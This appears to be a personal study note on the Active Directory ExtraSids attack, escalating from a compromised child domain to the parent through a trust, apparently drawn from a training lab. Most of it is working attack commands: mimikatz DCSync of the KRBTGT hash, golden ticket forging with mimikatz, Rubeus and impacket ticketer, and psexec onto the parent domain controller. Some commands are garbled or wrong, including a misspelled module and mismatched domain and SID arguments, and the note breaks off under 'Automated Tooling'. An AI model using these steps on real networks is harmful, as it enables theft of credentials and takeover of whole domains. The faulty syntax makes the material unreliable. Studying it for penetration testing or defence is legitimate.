Their are different Cross Domain attack we can perform, below are some Domain Trust attack that utilize child -> parent path and cross forest trust abuse

ExtraSids Attack:

After we compromised the child domain, if, due to misconfiguration (lack of SID filtering in place), what we can do is we add Enterprise Admin group SID into the child domain's account, and since lack of SID Filtering, it would be respected at the parent domain the treat us as Enterprise Admin.

The following is needed to carryon this attack:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.
(Note: This requires a compromise of the child domain, do not attempt if you did not compromise the domain as you would be stuck at first step - obtaining KRBTGT hash)

-Dumping KRBTGT Account's NT Hash with mimikatz:
```
mimikatz.exe
privilege::debug
lsadump::dcsync /user:<domain>\krbtgt #Mark down the hashes
#This specific line tell us the FQDN name of the child domain
[DC] '<domainfqdnname>' will be the domain

```

-Getting the child domain SID with PowerView:
```
Get-DomainSID
```

-Get SID of Enterprise Admins groups in parent domain using PowerView:
```
Get-DomainGroup -Domain <parentdomainname> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

We also need to designate a target username (does not need to be real), in example we would be using NJohn

We first craft us a golden ticket with mimikatz:
```
mimikatz.exe
privilege::debug
kerboros::golden /user: NJohn /domain:<parentdomainfqdnname> /sid:<enterpriseadminsid> /
#Example:
kerberos::golden /user:NJohn /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /
```

We then use klist to confirm the existence of the crafted golden ticket in our current session

If the ticket exist, we then have complete control over the parent domain, we can try listing domain controller C drive to validate, or we can proceed to perform a DCSync Attack:
```
#Example
ls \\academy-ea-dc01.inlanefreight.local\c$
```

Lastly, we can perform this attack by using rubeus as well

```
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<domainfqdn> /sid:<doaminsid>  /sids:<enterpriseadminsid> /user:<username> /ptt
```

We can also perform this attack from linux perspective:

Obtaining Domain SID via SID Bruteforcing by lookupsid.py:
```
lookupsid.py <domainname>/<username>@<dcipforchild>
```

Next, we obtain Enterprise Admin SID from parent domain:
```
lookupsid.py <domainname>/<username>@<dcipforparent> | grep -B12 "Enterprise Admins"
```

We then use impacket-ticketer to generate the golden ticket and this tool will save it as ccache file:
```
ticketer.py -nthash <krbtgthash> -domain <childdomainfqdn> -domain-sid <childomainsid> -extra-sid <enterpriseadminsid> NJohn
```

Setting the KRB5CCNAME env variable with the generated ccache:
```
export KRB5CCNAME=NJohn.ccache 
```

We then use impacket-psexec to connect to dc of parent domain:
```
psexec.py <childdomainname>/NJohn@a<parentdcname> -k -no-pass -target-ip <dcipforparent>
#Example:
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

Automated Tooling:

Thanks 